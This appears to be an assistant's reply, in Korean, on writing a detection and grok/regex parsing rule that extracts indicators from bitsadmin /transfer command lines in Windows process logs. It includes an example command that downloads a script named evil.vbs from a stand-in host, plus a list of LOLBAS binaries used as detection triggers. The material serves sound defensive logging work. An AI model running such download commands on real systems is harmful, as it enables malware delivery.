정리하려는 구조는 아래 3단계로 보면 됩니다.

## 1) 트리거 정의

먼저 **어떤 LOLBAS 행위를 볼 것인지**를 정합니다.

예:

* `bitsadmin`
* `certutil`
* `mshta`
* `regsvr32`
* `rundll32`
* `powershell`
* `cscript`
* `wscript`

즉, **트리거는 실행 파일명 또는 LOLBAS 패턴**입니다.

예시:

* `NewProcessName = C:\Windows\System32\bitsadmin.exe`
* 또는 `CommandLine` 안에 `bitsadmin /transfer` 포함

---

## 2) 대상 필드 지정

분석 대상은 말씀하신 대로 **CommandLine** 입니다.

예:

```text
bitsadmin /transfer mydownload http://example.com/download.log:evil.vbs C:\temp\local.vbs
```

이 문자열 전체에서 필요한 값을 꺼냅니다.

즉:

* 트리거 필드: `NewProcessName` 또는 `CommandLine`
* 파싱 대상 필드: `CommandLine`

이렇게 분리하면 깔끔합니다.

---

## 3) 추출 값에 대한 grok 기반 정규식 작성

여기서 핵심은 **CommandLine 안에서 원하는 인자만 캡처**하는 것입니다.

지금 예제에서는 최종적으로 추출하려는 값이:

```text
C:\temp\local.vbs
```

이므로, grok 또는 정규식으로 **마지막 destination path**를 뽑으면 됩니다.

예를 들어 개념적으로는:

```text
bitsadmin /transfer <jobname> <remote_source> <local_destination>
```

이 구조이므로, 마지막 값을 추출하는 패턴을 만듭니다.

---

# 예시 설계

## A. 탐지 조건

```text
NewProcessName endswith bitsadmin.exe
AND
CommandLine contains "/transfer"
```

## B. 파싱 대상

```text
Field = CommandLine
```

## C. 추출 목표

* job name
* remote source
* local destination

---

# 정규식 예시

일반 정규식으로는:

```regex
(?i)bitsadmin\s+/transfer\s+(?<job>\S+)\s+(?<src>\S+)\s+(?<dst>.+)$
```

이렇게 두면:

* `job` = `mydownload`
* `src` = `http://example.com/download.log:evil.vbs`
* `dst` = `C:\temp\local.vbs`

---

# grok 스타일로 표현하면

환경마다 grok 문법 차이는 있지만, 보통 이런 식으로 설계합니다.

```text
%{WORD:lolbas}\s+/transfer\s+%{NOTSPACE:job}\s+%{NOTSPACE:src}\s+%{GREEDYDATA:dst}
```

이 경우:

* `lolbas` → `bitsadmin`
* `job` → `mydownload`
* `src` → `http://example.com/download.log:evil.vbs`
* `dst` → `C:\temp\local.vbs`

---

# 실무적으로는 이렇게 정의하면 됩니다

## 1. 룰 이름

`LOLBAS_BITSADMIN_TRANSFER_DEST_EXTRACT`

## 2. 트리거

* 프로세스명: `bitsadmin.exe`
* 또는 CommandLine 내 `bitsadmin /transfer`

## 3. 대상 필드

* `CommandLine`

## 4. 파싱 패턴

```regex
(?i)bitsadmin\s+/transfer\s+(?<job>\S+)\s+(?<src>\S+)\s+(?<dst>.+)$
```

## 5. 추출 결과

* `dst`

---

# 중요한 점

이 작업은 사실 두 단계로 나뉩니다.

## 1단계: 탐지

이 로그가 `bitsadmin` LOLBAS 행위인지 식별

## 2단계: 파싱

탐지된 `CommandLine`에서 원하는 IOC를 추출

즉, 말씀하신 구조대로:

* **트리거 = bitsadmin 같은 LOLBAS 정의**
* **대상 = CommandLine**
* **처리 = grok/정규식으로 값 추출**

이 흐름이 정확합니다.

원하시면 다음 단계로 바로 이어서
**bitsadmin, certutil, mshta, regsvr32, rundll32용 grok 패턴 표준안** 형태로 정리해 드리겠습니다.
